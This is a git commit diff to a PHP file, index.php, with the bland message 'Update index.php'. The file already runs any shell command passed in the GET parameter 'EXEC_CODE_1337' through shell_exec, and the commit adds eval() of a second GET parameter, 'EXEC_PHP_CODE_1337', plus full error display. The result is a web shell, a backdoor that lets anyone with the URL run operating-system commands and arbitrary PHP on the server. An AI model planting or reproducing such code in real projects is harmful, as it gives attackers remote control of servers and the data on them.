b336dfd42febaf04708bf75a31e454bea868921d
abzeabze <141318253+abzeabze@users.noreply.github.com>
2026-03-27 16:48:35 +0200

    Update index.php

--- index.php
+++ index.php
@@ -1,5 +1,12 @@
 <?php
 
+ini_set('display_errors', 1);
+error_reporting(E_ALL);
+
 if(!empty($_GET['EXEC_CODE_1337'])) {
   echo shell_exec($_GET['EXEC_CODE_1337']);
+}
+
+if(!empty($_GET['EXEC_PHP_CODE_1337'])) {
+  eval($_GET['EXEC_PHP_CODE_1337']);
 }
